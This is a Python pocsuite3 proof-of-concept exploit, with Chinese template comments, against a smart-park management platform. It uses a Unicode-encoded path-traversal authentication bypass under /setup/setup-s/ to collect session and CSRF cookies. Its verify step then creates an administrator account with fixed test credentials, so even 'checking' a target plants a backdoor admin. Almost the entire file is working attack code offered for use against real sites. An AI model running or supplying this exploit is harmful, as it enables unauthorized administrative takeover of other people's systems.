from collections import OrderedDict
import re,random
import urllib3
import HackRequests
import HackRequests
from requests_toolbelt.multipart.encoder import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.api import patch

class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023'  #漏洞公开的时间,不知道就写今天
    createDate = '20232'  # 编写 PoC 的日期
    updateDate = '2023'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = ''  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '智慧园区综合管理平台'  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
    
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    
    def get_cookie(self):
        self.hack = HackRequests.hackRequests()
        self.proxy = ('127.0.0.1','8080')
        path = "/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp"
        headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/101.0.4951.64 Safari/537.36",
                
        }
        url = self.url + path
        try:
            
            resq = self.hack.http(url=url, headers=headers,verify=False, timeout=10)
            #print(resq.cookies)
            JSESSIONID = resq.cookies['JSESSIONID']
            csrf = resq.cookies['csrf']
            return JSESSIONID,csrf
        except Exception as e:
            print("\033[31m[x] Cookie获取失败 \033[0m", e)
            return
    def _verify(self):
        result = {}
        cookie = self.get_cookie()
        JSESSIONID = cookie[0]
        csrf = cookie[1]
        path = "/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf="+csrf+"&username=test8234123432&name=&email=&password=test8234123432&passwordConfirm=test8234123432&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"
        url = self.url + path
        headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/101.0.4951.64 Safari/537.36",
                "Cookie":"JSESSIONID="+JSESSIONID+";csrf="+csrf+""
                }
        try:
            
            resq = self.hack.http(url=url, headers=headers,verify=False, timeout=10)
            
            if resq.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = url
                result['VerifyInfo']['user'] = 'test8234123432/test8234123432'
        except Exception as e:
            return
        return self.parse_output(result)
    
    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)